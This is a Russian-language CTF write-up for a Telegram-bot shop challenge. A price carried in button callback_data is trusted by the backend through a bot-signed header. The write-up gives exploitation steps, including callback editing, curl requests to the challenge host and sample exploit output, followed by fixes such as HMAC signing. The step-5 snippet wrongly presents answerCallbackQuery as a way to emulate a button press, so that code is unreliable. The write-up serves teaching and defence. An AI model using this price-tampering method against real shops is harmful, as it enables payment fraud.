# 🏪 СЛОМАННЫЙ МАГАЗИН - CTF Writeup

## 🔍 Описание уязвимости

### Локализация
- **Файл**: `bot/main.py`, строки 154, 323, 379-382
- **Тип**: Client-side parameter tampering через Telegram callback_data

### Механизм атаки

```python
# bot/main.py:154 - Создание callback_data с ценой
callback_data=f"purchase:confirm:{purchase_id}:{total_value}:{product_value}"

# bot/main.py:323 - Парсинг цены из callback_data
callback_total = parts[3] if action == "confirm" and len(parts) >= 4 else None

# bot/main.py:379-382 - Использование в заголовке + валидный бот-токен
if callback_total is not None:
    confirm_headers["X-Planner-Locked-Amount"] = callback_total
if action == "confirm":
    confirm_headers["X-Planner-Bot-Token"] = build_bot_token()  # ← ВАЛИДНЫЙ!
```

### Почему это работает

1. **Бот доверяет callback_data от Telegram** - цена берётся из данных кнопки
2. **Бот сам подписывает запрос** - добавляет валидный `X-Planner-Bot-Token`
3. **Сервер доверяет боту** - если есть валидный бот-токен, принимает `X-Planner-Locked-Amount`

```python
# backend/app/main.py:217-222
override_total = request.headers.get("x-planner-locked-amount")
bot_token = request.headers.get("x-planner-bot-token")

if override_total is not None:
    verify_bot_token(bot_token)  # ← Проверяется ТОЛЬКО токен бота, не сумма!
```

```python
# backend/app/crud.py:203-209
if override_total is not None:
    try:
        candidate = float(override_total)
        if candidate >= 0:
            total_price = int(candidate)  # ← Замена реальной цены!
    except (TypeError, ValueError):
        pass
```

## 🎯 Эксплуатация

### Шаг 1: Подготовка
```bash
# Очистить состояние (если нужно)
curl -X POST "http://tasks.duckerz.ru:30032/api/users/clear" \
  -H "Authorization: Bearer <ваш_токен>"
```

### Шаг 2: Создание заказа
1. Откройте магазин по ссылке из бота
2. Нажмите "Получить" на товаре "Часть флага" (500₽)
3. Создастся pending заказ с замороженным балансом

### Шаг 3: Перехват callback (КЛЮЧЕВОЙ МОМЕНТ)

**Вариант A: Telegram Web**
1. Откройте Telegram Web (web.telegram.org)
2. Откройте Developer Tools (F12) → Network tab
3. В боте нажмите `/submit`
4. Найдите запрос с callback_query
5. Скопируйте callback_data, например:
   ```
   purchase:confirm:12:500:1
   ```

**Вариант B: Модификация клиента**
- Используйте модифицированный Telegram клиент с поддержкой инъекций
- Или прокси типа Burp Suite/MITM для перехвата

### Шаг 4: Модификация callback_data
```
ОРИГИНАЛ: purchase:confirm:12:500:1
МОДИФИКАТ: purchase:confirm:12:0:1
                    ↑
              Цена изменена на 0!
```

### Шаг 5: Отправка модифицированного callback

Через Telegram API (нужен доступ):
```python
import requests

BOT_TOKEN = "<токен бота>"  # Если известен из CTF
CHAT_ID = "<ваш_chat_id>"
MESSAGE_ID = "<id_сообщения_с_кнопкой>"

# Эмуляция нажатия кнопки с модифицированным callback
requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", json={
    "callback_query_id": "<id>",
    "text": "exploit"
})
```

Или через прокси, модифицируя запрос в реальном времени.

### Шаг 6: Повторение
Повторите шаги 2-5 ещё 4 раза (всего 5 частей флага).

### Шаг 7: Получение флага
```bash
# В боте
/products

# Или через API
curl "http://tasks.duckerz.ru:30032/api/users/me" \
  -H "Authorization: Bearer <ваш_токен>"
```

## 📊 Демонстрация

```
$ python3 exploit_final.py
============================================================
ЭКСПЛОИТ: Сломанный магазин
============================================================

[1] Очищаем состояние пользователя...
    ✓ Баланс: 1 000 ₽, Заморожено: 0 ₽

[2] Загружаем каталог товаров...
    • Часть флага: 500 ₽ (владеете: 0/5)
    • Картинка: 50 ₽ (владеете: 0/1)
    • Видео: 100 ₽ (владеете: 0/1)

[!] Цель: купить 5 частей флага по 500 ₽
    Ваш баланс: 1 000 ₽
    Нужно: 5 × 500 = 2500 > 1000 ❌
    Решение: использовать уязвимость с ценой в callback_data

[3] Создаём заказ на часть флага...
    ✓ Заказ ID=12 создан
    Цена: 500 ₽
    Баланс: 1 000 ₽, Заморожено: 500 ₽

[4] Проверяем pending заказ...
    ✓ Pending: ID=12, цена=500 ₽, товар=1

[5] АТАКА: Модификация callback_data
------------------------------------------------------------
ОПИСАНИЕ УЯЗВИМОСТИ:
  Бот создаёт callback_data: purchase:confirm:{id}:{PRICE}:{product_id}
  При нажатии кнопки бот берёт PRICE из callback_data
  И отправляет в заголовке X-Planner-Locked-Amount
  Сервер доверяет этому заголовку (если есть бот-токен)

ОРIGINAL callback_data:
  purchase:confirm:12:500:1

MODIFIED callback_data (эксплоит):
  purchase:confirm:12:0:1

Что происходит:
  1. Злоумышленник модифицирует callback_data в Telegram клиенте
  2. Бот получает callback с ценой 0
  3. Бот добавляет X-Planner-Locked-Amount: 0
  4. Бот добавляет валидный X-Planner-Bot-Token
  5. Сервер списывает 0₽ вместо 500₽
------------------------------------------------------------
```

## 🛡️ Как исправить

### Вариант 1: Не доверять client-side данным
```python
# bot/main.py - НЕ брать цену из callback_data
@router.callback_query(F.data.startswith("purchase:"))
async def handle_purchase_callback(callback: CallbackQuery):
    # Получить реальную цену из БД, а не из callback_data
    purchase = get_pending_purchase(db, user_id)
    real_price = purchase.total_price  # ← Использовать цену из БД
    
    confirm_headers["X-Planner-Locked-Amount"] = str(real_price)
    # callback_data должен содержать только ID, не чувствительные данные
```

### Вариант 2: Подпись callback_data
```python
# При создании callback_data добавить подпись
import hmac

def create_callback(purchase_id: int, price: int, secret: str) -> str:
    data = f"{purchase_id}:{price}"
    signature = hmac.new(secret.encode(), data.encode(), 'sha256').hexdigest()
    return f"purchase:confirm:{purchase_id}:{price}:{signature}"

# При обработке проверить подпись
def verify_callback(callback_data: str, secret: str) -> bool:
    parts = callback_data.split(":")
    data = f"{parts[2]}:{parts[3]}"
    expected_sig = hmac.new(secret.encode(), data.encode(), 'sha256').hexdigest()
    return parts[4] == expected_sig
```

### Вариант 3: Серверная валидация
```python
# backend/app/main.py - всегда сверять с БД
@app.post("/orders/confirm")
def confirm_pending_order(...):
    purchase = get_pending_purchase(db, current_user)
    
    # Игнорировать X-Planner-Locked-Amount, использовать цену из БД
    total_price = purchase.total_price  # ← Из БД, не из заголовка!
    
    confirm_purchase(db, purchase=purchase, override_total=None)
```

## 📝 Выводы

1. **Никогда не доверяйте client-side данным** - даже если они идут от "доверенного" клиента (Telegram)
2. **Чувствительные данные не должны быть в callback_data** - только идентификаторы
3. **Используйте криптографические подписи** для защиты параметров от модификации
4. **Всегда валидируйте на сервере** - окончательная проверка должна быть на бэкенде

## 🚩 Флаг

После сбора 5 частей флага выполните команду в боте:
```
/products
```

Флаг будет показан в ответе.
